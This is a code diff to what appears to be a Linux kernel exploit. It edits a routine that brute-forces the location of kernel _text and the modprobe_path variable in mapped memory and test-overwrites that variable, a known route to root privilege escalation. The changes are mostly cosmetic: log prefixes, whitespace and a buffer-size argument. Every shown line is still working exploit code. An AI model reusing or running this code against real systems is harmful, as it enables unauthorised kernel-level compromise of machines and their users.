@@ -458,7 +458,7 @@ void *memmem_modprobe_path_bruteforce(void *memory, size_t memory_size)
 	char *kernel_text = NULL;
 	char modprobe_path[KMOD_PATH_LEN] = { 0 };
 	size_t modprobe_path_len = 0;
-        char *modprobe_path_uaddr = NULL;
+	char *modprobe_path_uaddr = NULL;
 	char *window_end;
 	char *scan;
 
@@ -466,7 +466,7 @@ void *memmem_modprobe_path_bruteforce(void *memory, size_t memory_size)
 	 * We search for kernel _text first.
 	 * It is always aligned by CONFIG_PHYSICAL_ALIGN.
 	 */
-	printf("[!] searching kernel _text in %p-%p\n", start, end);
+	printf("[!] searching kernel _text and modprobe_path in %p-%p\n", start, end);
 	while (offset < memory_size) {
 		if (is_kernel_text(start + offset)) {
 			kernel_text = start + offset;
@@ -475,7 +475,7 @@ void *memmem_modprobe_path_bruteforce(void *memory, size_t memory_size)
 		offset += CONFIG_PHYSICAL_ALIGN;
 	}
 	if (kernel_text == NULL) {
-		printf("[!] kernel _text is not found in this memory region\n");
+		printf("[-] kernel _text is not found in this memory region\n");
 		return NULL;
 	}
 	printf("[+] kernel _text is found at %p, now search modprobe_path\n", kernel_text);
@@ -498,19 +498,18 @@ void *memmem_modprobe_path_bruteforce(void *memory, size_t memory_size)
 		window_end = end;
 
 	scan = kernel_text;
-	/* false hit moves to the next candidate */
 	while (scan < window_end) {
 		modprobe_path_uaddr =
 			memmem(scan, window_end - scan, modprobe_path, modprobe_path_len);
 		if (modprobe_path_uaddr == NULL) {
-			printf("[!] modprobe_path is not found in this memory region\n");
+			printf("[-] modprobe_path is not found in this memory region\n");
 			return NULL;
 		}
 		printf("[+] found modprobe_path candidate at %p\n", modprobe_path_uaddr);
 
 		/* Test overwriting modprobe_path */
 		modprobe_path_uaddr[0] = 'x';
-		ret = get_modprobe_path(modprobe_path, KMOD_PATH_LEN);
+		ret = get_modprobe_path(modprobe_path, sizeof(modprobe_path));
 		/* Return the initial value back for now */
 		modprobe_path_uaddr[0] = '/';
 		if (ret == EXIT_FAILURE)
@@ -525,7 +524,7 @@ void *memmem_modprobe_path_bruteforce(void *memory, size_t memory_size)
 		scan = modprobe_path_uaddr + 1;
 	}
 
-	printf("[!] modprobe_path is not found in this memory region\n");
+	printf("[-] modprobe_path is not found in this memory region\n");
 	return NULL;
 }
 
